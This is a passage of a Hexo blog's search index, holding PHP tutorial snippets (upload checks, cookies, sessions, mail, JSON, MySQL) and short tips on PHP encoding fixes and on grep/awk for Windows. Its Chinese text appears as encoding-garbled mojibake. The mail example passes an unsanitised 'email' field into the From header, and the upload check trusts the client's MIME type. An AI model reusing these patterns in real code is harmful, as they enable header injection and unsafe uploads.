punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/pjpeg"</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/x-png"</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">204800</span><span class="token punctuation">)</span>    <span class="token comment">// å°äº 200 kb</span><span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span> <span class="token variable">$allowedExts</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"é”™è¯¯ï¼š: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ä¸Šä¼ æ–‡ä»¶å: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æ–‡ä»¶ç±»å‹: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æ–‡ä»¶å¤§å°: "</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" kB&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æ–‡ä»¶ä¸´æ—¶å­˜å‚¨çš„ä½ç½®: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"éæ³•çš„æ–‡ä»¶æ ¼å¼"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">//cookie å¸¸ç”¨äºè¯†åˆ«ç”¨æˆ·ã€‚cookie æ˜¯ä¸€ç§æœåŠ¡å™¨ç•™åœ¨ç”¨æˆ·è®¡ç®—æœºä¸Šçš„å°æ–‡ä»¶ã€‚æ¯å½“åŒä¸€å°è®¡ç®—æœºé€šè¿‡æµè§ˆå™¨è¯·æ±‚é¡µé¢æ—¶ï¼Œè¿™å°è®¡ç®—æœºå°†ä¼šå‘é€ cookieã€‚é€šè¿‡ PHPï¼Œæ‚¨èƒ½å¤Ÿåˆ›å»ºå¹¶å–å› cookie çš„å€¼ã€‚<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$expire</span><span class="token operator">=</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">*</span><span class="token number">30</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"runoob"</span><span class="token punctuation">,</span> <span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// è¾“å‡º cookie å€¼</span><span class="token keyword">echo</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// æŸ¥çœ‹æ‰€æœ‰ cookie</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// å­˜å‚¨ session æ•°æ®</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'views'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>èœé¸Ÿæ•™ç¨‹(runoob.com)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// æ£€ç´¢ session æ•°æ®</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"æµè§ˆé‡ï¼š"</span><span class="token operator">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'views'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'views'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'views'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'views'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'views'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"æµè§ˆé‡ï¼š"</span><span class="token operator">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'views'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'views'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'views'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//session_destroy();</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"xiaohui"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="mail"><a href="#mail" class="headerlink" title="mail"></a>mail</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>èœé¸Ÿæ•™ç¨‹(runoob.com)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// å¦‚æœæ¥æ”¶åˆ°é‚®ç®±å‚æ•°åˆ™å‘é€é‚®ä»¶</span>    <span class="token comment">// å‘é€é‚®ä»¶</span>    <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>    <span class="token variable">$subject</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'subject'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>    <span class="token function">mail</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"someone@example.com"</span><span class="token punctuation">,</span> <span class="token variable">$subject</span><span class="token punctuation">,</span>    <span class="token variable">$message</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"From:"</span> <span class="token operator">.</span> <span class="token variable">$email</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"é‚®ä»¶å‘é€æˆåŠŸ"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment">// å¦‚æœæ²¡æœ‰é‚®ç®±å‚æ•°åˆ™æ˜¾ç¤ºè¡¨å•</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;form method='post' action='mailform.php'&gt;    Email: &lt;input name='email' type='text'&gt;&lt;br&gt;    Subject: &lt;input name='subject' type='text'&gt;&lt;br&gt;    Message:&lt;br&gt;    &lt;textarea name='message' rows='15' cols='40'&gt;    &lt;/textarea&gt;&lt;br&gt;    &lt;input type='submit'&gt;    &lt;/form&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// é”™è¯¯å¤„ç†å‡½æ•°</span><span class="token keyword">function</span> <span class="token function-definition function">customError</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;b&gt;Error:&lt;/b&gt; [<span class="token interpolation"><span class="token variable">$errno</span></span>] <span class="token interpolation"><span class="token variable">$errstr</span></span>&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"è„šæœ¬ç»“æŸ"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// è®¾ç½®é”™è¯¯å¤„ç†å‡½æ•°</span><span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"customError"</span><span class="token punctuation">,</span><span class="token constant">E_USER_WARNING</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// è§¦å‘é”™è¯¯</span><span class="token variable">$test</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$test</span><span class="token operator">&gt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å˜é‡å€¼å¿…é¡»å°äºç­‰äº 1"</span><span class="token punctuation">,</span><span class="token constant">E_USER_WARNING</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'runoob'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'èœé¸Ÿæ•™ç¨‹'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'taobao'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'æ·˜å®ç½‘'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ç¼–ç ä¸­æ–‡</span>   <span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>  <span class="token comment">// æ¢è¡Œç¬¦</span>   <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span> <span class="token constant">JSON_UNESCAPED_UNICODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ä¸ç¼–ç ä¸­æ–‡</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'{"a":1,"b":2,"c":3,"d":4,"e":5}'</span><span class="token punctuation">;</span>   <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h3><p>æŸ¥è¯¢æ¨¡å—ç¤ºä¾‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"username"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"password"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"myDB"</span><span class="token punctuation">;</span><span class="token comment">// åˆ›å»ºè¿æ¥</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Check connection</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$conn</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¿æ¥å¤±è´¥: "</span> <span class="token operator">.</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT id, firstname, lastname FROM MyGuests"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// è¾“å‡ºæ•°æ®</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"id: "</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token operator">.</span> <span class="token string double-quoted-string">" - Name: "</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"firstname"</span><span class="token punctuation">]</span><span class="token operator">.</span> <span class="token string double-quoted-string">" "</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"lastname"</span><span class="token punctuation">]</span><span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"0 ç»“æœ"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ›´å¤šè¯·çœ‹<a href="https://www.runoob.com/php/php-mysql-intro.html">PHP MySQL ç®€ä»‹ | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p><h3 id="Mathå‡½æ•°"><a href="#Mathå‡½æ•°" class="headerlink" title="Mathå‡½æ•°"></a>Mathå‡½æ•°</h3><p><a href="https://www.runoob.com/php/php-ref-math.html">PHP 5 Math å‡½æ•° | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p><h3 id="HTTPå‡½æ•°"><a href="#HTTPå‡½æ•°" class="headerlink" title="HTTPå‡½æ•°"></a>HTTPå‡½æ•°</h3><p><a href="https://www.runoob.com/php/php-ref-http.html">PHP HTTP å‡½æ•° | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p><h3 id="Stringå‡½æ•°"><a href="#Stringå‡½æ•°" class="headerlink" title="Stringå‡½æ•°"></a>Stringå‡½æ•°</h3><p><a href="https://www.runoob.com/php/php-ref-string.html">PHP 5 String å‡½æ•° | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p><h3 id="Arrayå‡½æ•°"><a href="#Arrayå‡½æ•°" class="headerlink" title="Arrayå‡½æ•°"></a>Arrayå‡½æ•°</h3><p><a href="https://www.runoob.com/php/php-ref-array.html">PHP 5 Array å‡½æ•° | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p><h3 id="PDOå‡½æ•°"><a href="#PDOå‡½æ•°" class="headerlink" title="PDOå‡½æ•°"></a>PDOå‡½æ•°</h3><p><a href="https://www.runoob.com/php/php-pdo.html">PHP PDO | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> è¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹  </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpä¹±ç è§£å†³æ–¹æ³•</title>
      <link href="/2021/05/26/php-luan-ma/"/>
      <url>/2021/05/26/php-luan-ma/</url>
      
        <content type="html"><![CDATA[<h2 id="phpä¹±ç "><a href="#phpä¹±ç " class="headerlink" title="phpä¹±ç "></a>phpä¹±ç </h2><h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><p>headåï¼Œtilteå‰æ·»åŠ </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>Content-Type<span class="token punctuation">'</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/html; charset=utf-8<span class="token punctuation">'</span></span> <span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>å¼€å¤´æ·»åŠ </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> bug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win10ä½¿ç”¨grepå’Œawk</title>
      <link href="/2021/05/23/win10-shi-yong-grep/"/>
      <url>/2021/05/23/win10-shi-yong-grep/</url>
      
        <content type="html"><![CDATA[<h2 id="win10ä½¿ç”¨grepå’Œawk"><a href="#win10ä½¿ç”¨grepå’Œawk" class="headerlink" title="win10ä½¿ç”¨grepå’Œawk"></a>win10ä½¿ç”¨grepå’Œawk</h2><h3 id="win10ä½¿ç”¨grep"><a href="#win10ä½¿ç”¨grep" class="headerlink" title="win10ä½¿ç”¨grep"></a>win10ä½¿ç”¨grep</h3><p>è¿›å…¥<a href="http://www.interlog.com/~tcharron/grep.html">GREP for Windows (interlog.com)</a>æˆ–è€…<a href="http://gnuwin32.sourceforge.net/packages/grep.htm">Grep for Windows (sourceforge.net)</a></p><p>ä¸‹è½½-&gt;è§£å‹æˆ–å®‰è£…-&gt;å°†<code>XXXXX\grep20d_win</code>æ·»åŠ è‡³ç¯å¢ƒå˜é‡</p><p>ä»¥ç®¡ç†å‘˜æ–¹å¼æ‰“å¼€cmdï¼Œè¿è¡Œ<code>grep -S "searchtext" *.txt</code>æµ‹è¯•æˆåŠŸ</p><h3 id="win10ä½¿ç”¨awk"><a href="#win10ä½¿ç”¨awk" class="headerlink" title="win10ä½¿ç”¨awk"></a>win10ä½¿ç”¨awk</h3><p><a href="http://gnuwin32.sourceforge.net/packages/gawk.htm">Gawk for Windows (sourceforge.net)</a></p><p>ä¸‹è½½-&gt;å®‰è£…-&gt;å°†<code>XXXXX\GnuWin32\bin</code>æ·»åŠ è‡³ç¯å¢ƒå˜é‡</p><p>ä»¥ç®¡ç†å‘˜æ–¹å¼æ‰“å¼€cmdï¼Œè¿è¡Œawkæµ‹è¯•</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASCIIç è¡¨</title>
      <link href="/2021/05/19/ascii/"/>
      <url>/2021/05/19/ascii/</url>
      
